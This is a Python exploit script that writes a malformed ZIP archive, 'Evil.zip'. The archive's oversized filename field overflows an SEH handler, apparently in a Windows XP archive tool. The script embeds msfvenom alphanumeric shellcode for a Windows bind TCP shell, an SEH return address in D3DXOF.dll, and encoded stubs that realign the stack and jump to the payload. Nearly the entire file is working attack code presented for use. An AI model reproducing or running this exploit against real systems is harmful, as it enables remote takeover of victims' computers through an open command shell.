#!/usr/bin/python

# root@kali:~# msfvenom -p windows/shell_bind_tcp -b '\x00\x0a\x0d' -e x86/alpha_mixed BufferRegister=EAX -f python -v shellcode 
# Payload size: 710 bytes
shellcode =  ""
shellcode += "\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
shellcode += "\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58"
shellcode += "\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42"
shellcode += "\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
shellcode += "\x42\x75\x4a\x49\x69\x6c\x69\x78\x4c\x42\x73\x30"
shellcode += "\x37\x70\x57\x70\x55\x30\x6f\x79\x49\x75\x74\x71"
shellcode += "\x39\x50\x72\x44\x4e\x6b\x76\x30\x64\x70\x6e\x6b"
shellcode += "\x62\x72\x36\x6c\x4e\x6b\x76\x32\x34\x54\x6e\x6b"
shellcode += "\x44\x32\x74\x68\x66\x6f\x68\x37\x32\x6a\x37\x56"
shellcode += "\x35\x61\x6b\x4f\x4e\x4c\x65\x6c\x45\x31\x31\x6c"
shellcode += "\x43\x32\x64\x6c\x75\x70\x79\x51\x4a\x6f\x66\x6d"
shellcode += "\x76\x61\x6b\x77\x4d\x32\x7a\x52\x43\x62\x73\x67"
shellcode += "\x6e\x6b\x61\x42\x34\x50\x6e\x6b\x42\x6a\x75\x6c"
shellcode += "\x4c\x4b\x42\x6c\x57\x61\x63\x48\x6a\x43\x57\x38"
shellcode += "\x73\x31\x58\x51\x73\x61\x4c\x4b\x66\x39\x47\x50"
shellcode += "\x75\x51\x4e\x33\x6e\x6b\x37\x39\x32\x38\x49\x73"
shellcode += "\x74\x7a\x67\x39\x4e\x6b\x50\x34\x4e\x6b\x35\x51"
shellcode += "\x6e\x36\x56\x51\x39\x6f\x6c\x6c\x79\x51\x38\x4f"
shellcode += "\x74\x4d\x57\x71\x39\x57\x56\x58\x79\x70\x31\x65"
shellcode += "\x49\x66\x44\x43\x61\x6d\x4c\x38\x45\x6b\x63\x4d"
shellcode += "\x45\x74\x72\x55\x7a\x44\x62\x78\x6e\x6b\x76\x38"
shellcode += "\x47\x54\x76\x61\x59\x43\x70\x66\x4e\x6b\x36\x6c"
shellcode += "\x70\x4b\x4e\x6b\x71\x48\x75\x4c\x76\x61\x4e\x33"
shellcode += "\x6c\x4b\x56\x64\x6e\x6b\x46\x61\x7a\x70\x6b\x39"
shellcode += "\x71\x54\x45\x74\x57\x54\x43\x6b\x33\x6b\x75\x31"
shellcode += "\x30\x59\x61\x4a\x30\x51\x79\x6f\x39\x70\x63\x6f"
shellcode += "\x43\x6f\x30\x5a\x6c\x4b\x52\x32\x48\x6b\x6c\x4d"
shellcode += "\x43\x6d\x30\x68\x67\x43\x47\x42\x35\x50\x77\x70"
shellcode += "\x53\x58\x34\x37\x32\x53\x64\x72\x43\x6f\x46\x34"
shellcode += "\x31\x78\x72\x6c\x44\x37\x65\x76\x63\x37\x69\x6f"
shellcode += "\x6e\x35\x4c\x78\x6e\x70\x53\x31\x57\x70\x65\x50"
shellcode += "\x47\x59\x6a\x64\x71\x44\x42\x70\x70\x68\x44\x69"
shellcode += "\x6b\x30\x42\x4b\x67\x70\x4b\x4f\x38\x55\x33\x5a"
shellcode += "\x57\x78\x62\x79\x32\x70\x38\x62\x4b\x4d\x47\x30"
shellcode += "\x36\x30\x73\x70\x50\x50\x62\x48\x7a\x4a\x74\x4f"
shellcode += "\x6b\x6f\x39\x70\x69\x6f\x78\x55\x6a\x37\x32\x48"
shellcode += "\x66\x62\x73\x30\x34\x51\x51\x4c\x4c\x49\x5a\x46"
shellcode += "\x31\x7a\x42\x30\x31\x46\x66\x37\x55\x38\x68\x42"
shellcode += "\x39\x4b\x44\x77\x51\x77\x49\x6f\x4a\x75\x32\x77"
shellcode += "\x51\x78\x38\x37\x6a\x49\x75\x68\x69\x6f\x49\x6f"
shellcode += "\x6a\x75\x70\x57\x71\x78\x43\x44\x68\x6c\x67\x4b"
shellcode += "\x49\x71\x69\x6f\x69\x45\x51\x47\x6c\x57\x31\x78"
shellcode += "\x54\x35\x42\x4e\x72\x6d\x71\x71\x59\x6f\x39\x45"
shellcode += "\x45\x38\x33\x53\x72\x4d\x53\x54\x55\x50\x4c\x49"
shellcode += "\x6b\x53\x42\x77\x51\x47\x76\x37\x70\x31\x79\x66"
shellcode += "\x53\x5a\x32\x32\x73\x69\x66\x36\x49\x72\x39\x6d"
shellcode += "\x70\x66\x48\x47\x51\x54\x47\x54\x35\x6c\x35\x51"
shellcode += "\x56\x61\x6c\x4d\x47\x34\x34\x64\x32\x30\x7a\x66"
shellcode += "\x35\x50\x43\x74\x73\x64\x46\x30\x70\x56\x50\x56"
shellcode += "\x32\x76\x43\x76\x33\x66\x50\x4e\x62\x76\x43\x66"
shellcode += "\x73\x63\x32\x76\x70\x68\x62\x59\x58\x4c\x47\x4f"
shellcode += "\x6b\x36\x39\x6f\x4a\x75\x6c\x49\x69\x70\x72\x6e"
shellcode += "\x52\x76\x33\x76\x39\x6f\x76\x50\x52\x48\x46\x68"
shellcode += "\x6e\x67\x47\x6d\x33\x50\x79\x6f\x79\x45\x6f\x4b"
shellcode += "\x78\x70\x6e\x55\x79\x32\x56\x36\x73\x58\x6e\x46"
shellcode += "\x6a\x35\x4f\x4d\x4d\x4d\x59\x6f\x39\x45\x65\x6c"
shellcode += "\x77\x76\x61\x6c\x47\x7a\x4f\x70\x79\x6b\x69\x70"
shellcode += "\x62\x55\x54\x45\x6f\x4b\x51\x57\x56\x73\x64\x32"
shellcode += "\x62\x4f\x52\x4a\x37\x70\x43\x63\x4b\x4f\x49\x45"
shellcode += "\x41\x41"

####################### ZIP File Structure ######################## 
###################################################################
######################## Local File Header ########################
LocalFileHeader  = '\x50\x4b\x03\x04' # local file header signature
LocalFileHeader += '\x14\x00'         # version needed to extract 0x14 = 20 -> 2.0
LocalFileHeader += '\x00\x00'         # general purpose bit flag
LocalFileHeader += '\x00\x00'         # compression method
LocalFileHeader += '\xb7\xac'         # file last modification time 0xacb7 -> H=21 M=37 S=23 -> 21:37:23
LocalFileHeader += '\xce\x34'         # file last modification date 0x34ce -> D=3 M=6 Y=2006 -> 2006/6/3
LocalFileHeader += '\x00\x00\x00'     # CRC-32 '\x00' was left out to make sure we hit 25 bytes before file length
LocalFileHeader += '\x00\x00\x00\x00' # compressed size
LocalFileHeader += '\x00\x00\x00\x00' # uncompressed size
LocalFileHeader += '\xe4\x0f'         # file name length 0x0fe4 = 4068 bytes 
LocalFileHeader += '\x00\x00'         # extra field length
LocalFileHeader += '\x00'             # file name
#LocalFileHeader += '\x00'             # extra filed 
################## Central Directory File Header ##################
CDFileHeader     = '\x50\x4b\x01\x02' # cd file header signature 
CDFileHeader    += '\x14\x00'         # version made by 0x14 = 20 -> 2.0
CDFileHeader    += '\x14\x00'         # version needed to extract 0x14 = 20 -> 2.0
CDFileHeader    += '\x00\x00'         # general purpose bit flag
CDFileHeader    += '\x00\x00'         # compression method 
CDFileHeader    += '\xb7\xac'         # file last modification time 0xacb7 -> H=21 M=37 S=23 -> 21:37:23
CDFileHeader    += '\xce\x34'         # file last modification date 0x34ce -> D=3 M=6 Y=2006 -> 2006/6/3
CDFileHeader    += '\x00\x00\x00\x00' # CRC-32
CDFileHeader    += '\x00\x00\x00\x00' # compressed size
CDFileHeader    += '\x00\x00\x00\x00' # uncompressed size
CDFileHeader    += '\xe4\x0f'         # file name length 0x0fe4 = 4068 bytes
CDFileHeader    += '\x00\x00'         # extra field length
CDFileHeader    += '\x00\x00'         # file comment length 
CDFileHeader    += '\x00\x00'         # disk number where file starts
CDFileHeader    += '\x01\x00'         # internal file attributes BIT 0: apparent ASCII/text file
CDFileHeader    += '\x24\x00\x00\x00' # external file attributes 
CDFileHeader    += '\x00\x00\x00\x00' # relative offset of local file header
#CDFileHeader    += '\x00'             # file name
#CDFileHeader    += '\x00'             # extra field 
#CDFileHeader    += '\x00'             # file comment 
################ End of Central Directory Record ##################
EOCDRHeader      = '\x50\x4b\x05\x06' # End of central directory signature
EOCDRHeader     += '\x00\x00'         # number of this disk 
EOCDRHeader     += '\x00\x00'         # disk where central directory starts 
EOCDRHeader     += '\x01\x00'         # number of central directory records on this disk 
EOCDRHeader     += '\x01\x00'         # total number of central directory records 
EOCDRHeader     += '\x12\x10\x00\x00' # size of central directory (4114 bytes)
EOCDRHeader     += '\x02\x10\x00\x00' # offset of start of central directory, relative to start of archive 
EOCDRHeader     += '\x00\x00'         # comment length 
#EOCDRHeader     += '\x00'             # comment 

Evil  = '\x41' * 294
Evil += '\x75\x06\x74\x06'            # nSEH JZ & JNZ (aka jump net)
Evil += '\x3d\x1b\x7e\x6d'            # SEH pop esi,pop ebx, retn in D3DXOF.dll (OS module - WinXP SP3)
Evil += '\x41\x41'                    # compensate for short jump
Evil += '\x54'                        # PUSH ESP                  * save stack pointer to edi 
Evil += '\x5F'                        # POP EDI
Evil += '\x54'                        # PUSH ESP                  * point esp to where we want to decode otherwise bad shellcode
Evil += '\x58'                        # POP EAX
Evil += '\x05\x24\x13\x11\x11'        # ADD EAX,11111324
Evil += '\x05\x25\x16\x11\x11'        # ADD EAX,11111625
Evil += '\x2D\x21\x22\x22\x22'        # SUB EAX,22222221
Evil += '\x50'                        # PUSH EAX
Evil += '\x5C'                        # POP ESP                   * mov eax to esp
#root@kali:/opt/Slink# python Slink.py                            * decode the following 
#Enter your shellcode: 89FC89F8054E070000FFE0                       mov    esp,edi           restore stack pointer 
#[!] Shellcode size is not divisible by 4                           mov    eax,edi           use edi as an relative address 
#[+] Padding shellcode with 1 NOPS..                                add    eax,0x74e         align eax to the start oh shellcode 
#[+] Encoding [90e0ff00]..                                          jmp    eax               jump to shellcode 
#[!] [01] and/or [f] and/or [00] found, using alterantive encoder..
Evil += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
Evil += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
Evil += "\x05\x11\x77\x61\x41" ## add  eax, 0x41617711
Evil += "\x05\x11\x66\x51\x41" ## add  eax, 0x41516611
Evil += "\x05\x11\x55\x61\x41" ## add  eax, 0x41615511
Evil += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
Evil += "\x50"                 ## push eax
#[+] Encoding [00074e05]..
#[!] [01] and/or [f] and/or [00] found, using alterantive encoder..
Evil += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
Evil += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
Evil += "\x05\x13\x36\x13\x11" ## add  eax, 0x11133613
Evil += "\x05\x13\x25\x13\x11" ## add  eax, 0x11132513
Evil += "\x05\x12\x26\x13\x11" ## add  eax, 0x11132612
Evil += "\x2D\x33\x33\x32\x33" ## sub  eax, 0x33323333
Evil += "\x50"                 ## push eax
#[+] Encoding [f889fc89]..
#[!] [01] and/or [f] and/or [00] found, using alterantive encoder..
Evil += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
Evil += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
Evil += "\x05\x44\x76\x44\x74" ## add  eax, 0x74447644
Evil += "\x05\x44\x65\x44\x64" ## add  eax, 0x64446544
Evil += "\x05\x34\x54\x34\x53" ## add  eax, 0x53345434
Evil += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
Evil += "\x50"                 ## push eax
Evil += '\x42' * (250-116)
Evil += shellcode 
Evil += '\x41' * (4064-294-4-4-250-len(shellcode))
Evil += '.txt'

buffer  = LocalFileHeader
buffer += Evil
buffer += CDFileHeader
buffer += Evil
buffer += EOCDRHeader  

try:
	f=open("Evil.zip","w")
	print "[+] Creating %s bytes evil payload.." %len(Evil)
	f.write(buffer)
	f.close()
	print "[+] File created!"
except Exception as e:
	print e